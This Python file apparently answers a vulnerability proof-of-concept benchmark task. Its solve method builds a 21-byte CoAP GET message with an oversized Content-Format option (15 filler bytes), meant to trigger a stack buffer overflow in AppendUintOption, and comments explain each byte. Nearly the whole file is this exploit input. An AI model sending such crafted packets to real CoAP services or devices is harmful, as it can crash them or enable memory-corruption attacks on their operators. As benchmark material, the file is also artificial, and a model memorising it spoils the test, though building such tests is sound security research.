import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow in AppendUintOption.
        The vulnerability likely occurs when a Uint option (like Content-Format) has
        an unexpectedly large length, overflowing a fixed-size stack buffer.
        
        Target Length: 21 bytes.
        """
        # CoAP Header (4 bytes)
        # Ver: 1 (2 bits) -> 01
        # Type: 0 (CON, 2 bits) -> 00
        # TKL: 0 (4 bits) -> 0000
        # Byte 0: 01000000 -> 0x40
        # Code: 0x01 (GET)
        # Message ID: 0x1234 (Arbitrary)
        header = b'\x40\x01\x12\x34'
        
        # Option Construction (17 bytes)
        # We use Option ID 12 (Content-Format) which is a Uint option.
        # We want to maximize the payload size to ensure overflow within the 21-byte limit.
        # 21 bytes total - 4 bytes header = 17 bytes for the option.
        # We need an option header.
        # If we use Delta=12, Length=13, we use 1 byte for option header and 1 byte for extended length.
        # This leaves 17 - 2 = 15 bytes for the payload.
        # 15 bytes is significantly larger than typical Uint sizes (1, 2, 4, 8), likely causing the crash.
        
        # Option Header Byte:
        # Delta = 12 (1100)
        # Length Nibble = 13 (1101) - indicates 8-bit extended length
        # Byte: 0xCD
        opt_header = b'\xCD'
        
        # Extended Length Byte:
        # Length = Value + 13. We want Length = 15.
        # Value = 15 - 13 = 2.
        ext_len = b'\x02'
        
        # Payload (15 bytes)
        payload = b'A' * 15
        
        # Total: 4 + 1 + 1 + 15 = 21 bytes
        return header + opt_header + ext_len + payload
